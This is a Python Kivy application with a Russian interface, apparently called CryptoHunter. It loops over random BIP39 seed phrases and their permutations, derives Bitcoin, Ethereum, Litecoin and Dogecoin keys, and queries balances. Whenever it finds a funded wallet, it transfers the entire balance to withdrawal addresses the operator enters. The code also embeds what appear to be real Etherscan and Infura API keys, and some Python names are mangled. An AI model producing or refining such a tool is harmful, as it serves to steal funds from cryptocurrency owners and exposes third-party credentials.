from kivy.app import App from kivy.uix.boxlayout import BoxLayout from kivy.uix.label import Label from kivy.uix.textinput import TextInput from kivy.uix.button import Button from kivy.uix.scrollview import ScrollView import asyncio import threading import random import itertools import multiprocessing from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsListGetter, Bip39MnemonicValidator import aiohttp from web3 import Web3 from bitcoinlib.wallets import Wallet import traceback

ETHERSCAN_API_KEY = "WK8ZFPTSGFA2SX8469TRE7BSVXSUGA2VQ5" ETH_RPC_URL = "https://mainnet.infura.io/v3/12dca2118a8c412ab8119f71235a4a62" w3 = Web3(Web3.HTTPProvider(ETH_RPC_URL))

LITECOIN_NETWORK = 'litecoin' DOGECOIN_NETWORK = 'dogecoin'

def fetch_json_sync(url): try: import requests resp = requests.get(url, timeout=10) return resp.json() except: return None

def check_balance(coin, address): if coin == 'Bitcoin': url = f"https://blockchain.info/balance?active={address}" data = fetch_json_sync(url) return data and address in data and data[address].get("final_balance", 0) > 0 elif coin == 'Ethereum': url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={ETHERSCAN_API_KEY}" data = fetch_json_sync(url) return data and data.get("result") and int(data["result"]) > 0 elif coin == 'Litecoin': url = f"https://chain.so/api/v2/get_address_balance/LTC/{address}" data = fetch_json_sync(url) return data and data.get("status") == "success" and float(data["data"]["confirmed_balance"]) > 0 elif coin == 'Dogecoin': url = f"https://chain.so/api/v2/get_address_balance/DOGE/{address}" data = fetch_json_sync(url) return data and data.get("status") == "success" and float(data["data"]["confirmed_balance"]) > 0 return False

def seed_to_priv_and_address(seed_phrase, coin_enum, count): seed_bytes = Bip39SeedGenerator(seed_phrase).Generate() bip44_mst_ctx = Bip44.FromSeed(seed_bytes, coin_enum) priv_keys = [] addresses = [] for i in range(count): bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i) priv_keys.append(bip44_acc_ctx.PrivateKey().Raw().ToHex()) addresses.append(bip44_acc_ctx.PublicKey().ToAddress()) return priv_keys, addresses

def permute_seed(seed_phrase, max_permutations=20): words = seed_phrase.split() perms = set(itertools.islice(itertools.permutations(words), max_permutations)) return [' '.join(p) for p in perms]

def send_coin(private_key_wif, target_address, network): try: w = Wallet.create('temp_wallet', keys=private_key_wif, network=network, db_uri='sqlite:///:memory:') balance = w.get_balance() if balance <= 0: return False tx = w.send_to(target_address, balance, fee='fastest') return tx.txid except Exception: return False finally: try: w.delete() except: pass

def send_eth(priv_key_hex, target_address): try: acct = w3.eth.account.from_key(priv_key_hex) balance = w3.eth.get_balance(acct.address) if balance <= 0: return False nonce = w3.eth.get_transaction_count(acct.address) gas_price = w3.eth.gas_price tx = { 'nonce': nonce, 'to': target_address, 'value': balance - gas_price * 21000, 'gas': 21000, 'gasPrice': gas_price, } signed_tx = acct.sign_transaction(tx) tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction) return tx_hash.hex() except Exception: return False

def process_seed(args): seed_phrase, addr_count, perm_count, targets = args validator = Bip39MnemonicValidator() perms = permute_seed(seed_phrase, perm_count) coin_enum_map = { 'Bitcoin': Bip44Coins.BITCOIN, 'Ethereum': Bip44Coins.ETHEREUM, 'Litecoin': Bip44Coins.LITECOIN, 'Dogecoin': Bip44Coins.DOGECOIN, } for perm in perms: if not validator.IsValid(perm): continue for coin_name in ['Bitcoin', 'Ethereum', 'Litecoin', 'Dogecoin']: try: priv_keys, addresses = seed_to_priv_and_address(perm, coin_enum_map[coin_name], addr_count) for priv_key, addr in zip(priv_keys, addresses): if check_balance(coin_name, addr): if coin_name == 'Ethereum': txid = send_eth(priv_key, targets[coin_name]) else: network = coin_name.lower() txid = send_coin(priv_key, targets[coin_name], network) return f"Найден! {coin_name}: {addr}\nTXID: {txid if txid else 'Ошибка перевода'}" except: continue return None

class CryptoHunterLayout(BoxLayout): def init(self, **kwargs): super().init(**kwargs) self.orientation = 'vertical' self.addr_inputs = {}

for coin in ['Bitcoin', 'Ethereum', 'Litecoin', 'Dogecoin']:
        self.add_widget(Label(text=f'Адрес вывода {coin}:'))
        ti = TextInput(multiline=False, size_hint_y=None, height=30)
        self.addr_inputs[coin] = ti
        self.add_widget(ti)

    self.addr_count_input = TextInput(text='3', multiline=False, size_hint_y=None, height=30)
    self.add_widget(Label(text='Количество адресов для проверки:'))
    self.add_widget(self.addr_count_input)

    self.perm_count_input = TextInput(text='10', multiline=False, size_hint_y=None, height=30)
    self.add_widget(Label(text='Максимум перестановок seed-фразы:'))
    self.add_widget(self.perm_count_input)

    self.count_label = Label(text="Проверено: 0")
    self.add_widget(self.count_label)

    self.start_btn = Button(text='Старт')
    self.start_btn.bind(on_press=self.start_hunting)
    self.add_widget(self.start_btn)

    self.stop_btn = Button(text='Стоп', disabled=True)
    self.stop_btn.bind(on_press=self.stop_hunting)
    self.add_widget(self.stop_btn)

    clear_btn = Button(text='Очистить лог')
    clear_btn.bind(on_press=lambda x: self.clear_log())
    self.add_widget(clear_btn)

    self.log_label = Label(size_hint_y=None, height=400)
    self.scroll = ScrollView()
    self.scroll.add_widget(self.log_label)
    self.add_widget(self.scroll)

    self.log_lines = []
    self.checked_seeds = 0
    self.running = False
    self.pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())

def log(self, msg):
    self.log_lines.append(msg)
    if len(self.log_lines) > 40:
        self.log_lines.pop(0)
    self.log_label.text = '\n'.join(self.log_lines)
    self.scroll.scroll_y = 0

def clear_log(self):
    self.log_lines.clear()
    self.log_label.text = ""

def start_hunting(self, instance):
    for coin, ti in self.addr_inputs.items():
        if not ti.text.strip():
            self.log(f"Введите адрес вывода для {coin}")
            return
    try:
        self.addr_count = max(1, min(5, int(self.addr_count_input.text.strip())))
        self.perm_count = max(1, min(50, int(self.perm_count_input.text.strip())))
    except:
        self.log("Ошибка в числовых настройках")
        return

    self.targets = {coin: ti.text.strip() for coin, ti in self.addr_inputs.items()}
    self.running = True
    self.start_btn.disabled = True
    self.stop_btn.disabled = False
    self.log("Старт поиска...")
    threading.Thread(target=self.hunt_loop).start()

def stop_hunting(self, instance):
    self.running = False
    self.start_btn.disabled = False
    self.stop_btn.disabled = True
    self.log("Остановлено пользователем.")

def hunt_loop(self):
    words = Bip39WordsListGetter.GetWordList()
    while self.running:
        seed_words = random.choices(words, k=12)
        seed_phrase = ' '.join(seed_words)
        self.checked_seeds += 1
        self.count_label.text = f"Проверено: {self.checked_seeds}"
        self.log(f"Проверяем seed: {seed_phrase}")

        result = self.pool.apply(process_seed, args=((seed_phrase, self.addr_count, self.perm_count, self.targets),))
        if result:
            self.log(result)
            self.running = False
            self.start_btn.disabled = False
            self.stop_btn.disabled = True
            break

class CryptoHunterApp(App): def build(self): return CryptoHunterLayout()

if name == 'main': multiprocessing.freeze_support() CryptoHunterApp().run()

